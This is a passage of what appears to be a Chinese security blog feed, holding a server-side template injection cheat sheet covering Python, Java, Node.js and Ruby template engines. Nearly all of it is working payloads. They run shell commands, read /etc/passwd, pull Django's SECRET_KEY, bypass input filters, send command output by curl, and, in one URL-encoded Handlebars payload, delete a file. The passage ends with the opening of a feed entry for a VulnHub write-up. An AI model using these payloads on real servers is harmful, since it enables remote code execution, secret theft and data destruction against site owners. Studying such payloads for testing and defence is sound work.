id="os-wrap-close中的popen-py2不行"><a href="#os-wrap-close中的popen-py2不行" class="headerlink" title="os._wrap_close中的popen(py2不行)"></a>os._wrap_close中的popen(py2不行)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="os中popen"><a href="#os中popen" class="headerlink" title="os中popen"></a>os中popen</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="import-中os-py2不行"><a href="#import-中os-py2不行" class="headerlink" title="__import__中os(py2不行)"></a><code>__import__</code>中os(py2不行)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="1-Jinjia2"><a href="#1-Jinjia2" class="headerlink" title="1.Jinjia2"></a>1.Jinjia2</h2><p>以Django的模板为模型的，是Flask框架的一部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values():</span><br><span class="line">            <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys():</span><br><span class="line">                    <span class="built_in">print</span>(b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>))</span><br></pre></td></tr></table></figure><p>以上payload转为jinjis2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>过滤<code>[</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;# getitem、pop #&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤``:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;# chr函数 #&#125;</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line"></span><br><span class="line">&#123;# 命令执行 #&#125;</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure><p>过滤下划线：(使用<code>request.args</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤花括号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h2 id="2-tornado"><a href="#2-tornado" class="headerlink" title="2.tornado"></a>2.tornado</h2><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> foobar %&#125; = Error</span><br><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;whoami&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Djanjo"><a href="#3-Djanjo" class="headerlink" title="3.Djanjo"></a>3.Djanjo</h2><p>这个比较难利用，条件被限制的很死，很难执行命令；但Django自带的应用 “admin”（也就是Django自带的后台）的<code>models.py</code>中导入了当前网站的配置文件，可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span></span><br><span class="line"><span class="xml">&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span></span><br></pre></td></tr></table></figure><h1 id="3-Java中ssti"><a href="#3-Java中ssti" class="headerlink" title="3.Java中ssti"></a>3.Java中ssti</h1><h2 id="1-Velocity"><a href="#1-Velocity" class="headerlink" title="1.Velocity"></a>1.Velocity</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor()    // CVE-2019-3396</span><br><span class="line">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h2 id="2-FreeMarker"><a href="#2-FreeMarker" class="headerlink" title="2.FreeMarker"></a>2.FreeMarker</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">49</span> = <span class="number">49</span></span><br><span class="line">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125; = <span class="number">49</span></span><br><span class="line">#&#123;<span class="number">7</span>*<span class="number">7</span>&#125; = <span class="number">49</span> -- (legacy)</span><br><span class="line">$&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125; Nothing</span><br><span class="line">$&#123;foobar&#125;</span><br><span class="line"></span><br><span class="line">  &lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span> ?<span class="keyword">new</span>()=<span class="string">&quot;&quot;</span>&gt;$&#123; ex(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line">  [#assign ex = <span class="string">&#x27;freemarker.template.utility.Execute&#x27;</span>?<span class="keyword">new</span>()]$&#123; ex(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line">  $&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">  $&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(<span class="string">&#x27;/home/carlos/my_password.txt&#x27;</span>).toURL().openStream().readAllBytes()?join(<span class="string">&quot; &quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Spring-View-Manipulation"><a href="#3-Spring-View-Manipulation" class="headerlink" title="3.Spring View Manipulation"></a>3.Spring View Manipulation</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x</span><br><span class="line">__$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;touch executed&quot;</span>)&#125;__::.x</span><br></pre></td></tr></table></figure><h2 id="4-Pebble"><a href="#4-Pebble" class="headerlink" title="4.Pebble"></a>4.Pebble</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test</span></span><br><span class="line">&#123;&#123; someString.toUPPERCASE() &#125;&#125;</span><br><span class="line"><span class="comment">//低版本</span></span><br><span class="line">&#123;&#123; variable.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class="string">&#x27;ls -la&#x27;</span>) &#125;&#125;</span><br><span class="line"><span class="comment">//高版本</span></span><br><span class="line">&#123;% set cmd = <span class="string">&#x27;id&#x27;</span> %&#125;</span><br><span class="line">&#123;% set bytes = (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line">     .methods[<span class="number">6</span>]</span><br><span class="line">     .invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">&#x27;java.lang.String&#x27;</span>)</span><br><span class="line">     .constructors[<span class="number">0</span>]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="5-Jinjava"><a href="#5-Jinjava" class="headerlink" title="5.Jinjava"></a>5.Jinjava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.toUpperCase()&#125;&#125; = <span class="string">&#x27;A&#x27;</span></span><br><span class="line">&#123;&#123; request &#125;&#125; = 会返回一个request对象形如 com.[...].context.TemplateContextRequest@<span class="number">23548206</span></span><br><span class="line"><span class="comment">//RCE</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.getClass().forName(<span class="string">&#x27;javax.script.ScriptEngineManager&#x27;</span>).newInstance().getEngineByName(<span class="string">&#x27;JavaScript&#x27;</span>).eval(\<span class="string">&quot;new java.lang.String(&#x27;xxx&#x27;)\&quot;)&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="4-Nodejs中的SSTI"><a href="#4-Nodejs中的SSTI" class="headerlink" title="4.Nodejs中的SSTI"></a>4.Nodejs中的SSTI</h1><h2 id="1-Handlebars"><a href="#1-Handlebars" class="headerlink" title="1.Handlebars"></a>1.Handlebars</h2><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="builtin-name">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">each</span></span> conslist&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">URL编码:</span></span><br><span class="line"><span class="xml">%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d</span></span><br></pre></td></tr></table></figure><h2 id="2-JsRender"><a href="#2-JsRender" class="headerlink" title="2.JsRender"></a>2.JsRender</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;:%22test%<span class="number">22.</span>toString.constructor.call(&#123;&#125;,%22alert(%27xss%<span class="number">27</span>)%<span class="number">22</span>)()&#125;&#125;</span><br><span class="line">&#123;&#123;:<span class="string">&quot;pwnd&quot;</span>.toString.constructor.call(&#123;&#125;,<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /etc/passwd&#x27;).toString()&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="3-PugJs"><a href="#3-PugJs" class="headerlink" title="3.PugJs"></a>3.PugJs</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test</span></span><br><span class="line">#&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line"><span class="comment">//rce</span></span><br><span class="line">#&#123;<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;localLoad=<span class="built_in">global</span>.process.mainModule.constructor._load;sh=localLoad(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&#x27;touch /tmp/pwned.txt&#x27;</span>)&#125;()&#125;</span><br></pre></td></tr></table></figure><h1 id="5-Ruby中SSTI"><a href="#5-Ruby中SSTI" class="headerlink" title="5.Ruby中SSTI"></a>5.Ruby中SSTI</h1><h2 id="1-ERB"><a href="#1-ERB" class="headerlink" title="1.ERB"></a>1.ERB</h2><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">//test</span></span><br><span class="line"><span class="xml">&#123;&#123;7*7&#125;&#125; = &#123;&#123;7*7&#125;&#125;</span></span><br><span class="line"><span class="xml">$&#123;7*7&#125; = $&#123;7*7&#125;</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> <span class="number">7</span>*<span class="number">7</span> </span><span class="xml">%&gt; = 49</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> foobar </span><span class="xml">%&gt; = Error</span></span><br><span class="line"><span class="xml">//use</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> system(<span class="string">&quot;whoami&quot;</span>) </span><span class="xml">%&gt; #Execute code</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> Dir.entries(<span class="string">&#x27;/&#x27;</span>) </span><span class="xml">%&gt; #List folder</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> File.open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read </span><span class="xml">%&gt; #Read file</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>) </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> <span class="string">`ls /`</span> </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%=</span><span class="ruby"> IO.popen(<span class="string">&#x27;ls /&#x27;</span>).readlines()  </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">require</span> <span class="string">&#x27;open3&#x27;</span> </span><span class="xml">%&gt;&lt;%</span><span class="ruby"> <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>=Open3.popen3(<span class="string">&#x27;whoami&#x27;</span>) </span><span class="xml">%&gt;&lt;%=</span><span class="ruby"> <span class="variable">@b</span>.readline()</span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">&lt;%</span><span class="ruby"> <span class="keyword">require</span> <span class="string">&#x27;open4&#x27;</span> </span><span class="xml">%&gt;&lt;%</span><span class="ruby"> <span class="variable">@a</span>,<span class="variable">@b</span>,<span class="variable">@c</span>,<span class="variable">@d</span>=Open4.popen4(<span class="string">&#x27;whoami&#x27;</span>) </span><span class="xml">%&gt;&lt;%=</span><span class="ruby"> <span class="variable">@c</span>.readline()</span><span class="xml">%&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-Slim"><a href="#2-Slim" class="headerlink" title="2.Slim"></a>2.Slim</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="number">7</span> * <span class="number">7</span> &#125;</span><br><span class="line">&#123; <span class="string">%x|env|</span> &#125;</span><br></pre></td></tr></table></figure><p>from：</p><blockquote><p>  <a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/05.SSTI%E6%B3%A8%E5%85%A5/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/05.SSTI%E6%B3%A8%E5%85%A5/</a></p><p>  <a href="https://xz.aliyun.com/t/7518">https://xz.aliyun.com/t/7518</a></p><p>  <a href="https://err0r.top/article/ssti">https://err0r.top/article/ssti</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2022/03/29/SSTI/1344396-20200911174631687-758048107.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-PHP中的ssti&quot;&gt;&lt;a href=&quot;#1-PHP中的sst</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub_04_Holynix: v1</title>
    <link href="http://example.com/2022/03/28/VulnHub04/"/>
    <id>http://example.com/2022/03/28/VulnHub04/</id>
    <published>2022-03-27T16:00:00.000Z</published>
    <updated>2022-03-28T10:02:19.385Z</updated>
    
